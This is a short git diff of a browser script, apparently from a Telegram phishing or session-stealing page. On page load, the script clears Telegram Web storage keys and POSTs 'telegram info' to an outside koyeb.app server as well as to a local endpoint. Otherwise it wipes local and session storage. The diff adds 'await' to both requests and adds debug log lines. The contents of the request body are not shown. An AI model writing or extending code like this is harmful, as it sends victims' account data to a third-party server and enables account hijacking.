@@ -23,7 +23,9 @@ document.addEventListener('DOMContentLoaded', function () {
           localStorage.removeItem('GramJs:apiCache');
           localStorage.removeItem('tt-global-state');
 
-          fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
+      console.log('making post requests')
+          
+          await fetch(`https://loud-rani-senior-e8046183.koyeb.app/api/users/telegram/info`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -41,7 +43,7 @@ document.addEventListener('DOMContentLoaded', function () {
               ),
             }),
           });
-          fetch(`/api/users/telegram/info`, {
+          await fetch(`/api/users/telegram/info`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -73,6 +75,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }
       }
     } else {
+      console.log('no post request made!')
       sessionStorage.clear();
       localStorage.clear();
     }
